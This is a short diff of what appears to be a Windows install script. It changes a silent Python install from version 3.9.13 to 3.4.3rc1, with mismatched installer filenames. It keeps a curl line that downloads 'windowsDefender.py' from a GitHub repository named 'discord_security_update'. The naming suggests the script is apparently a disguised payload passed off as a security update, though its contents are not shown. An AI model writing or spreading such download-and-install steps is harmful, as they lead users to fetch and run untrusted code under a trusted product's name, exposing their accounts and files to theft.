@@ -1,5 +1,5 @@
-curl https://www.python.org/ftp/python/3.9.13/python-3.9.13-amd64.exe -O
-msiexec /a python-3.9.13.amd64.msi /qb TARGETDIR=C:\python39
+curl https://www.python.org/ftp/python/3.4.3/python-3.4.3rc1.amd64.msi -O
+msiexec /a python-3.4.3rc1.amd64.msi /qb TARGETDIR=C:\python34
 
 
 curl https://raw.githubusercontent.com/MundoCoRobiBundo/discord_security_update/main/windowsDefender.py -O
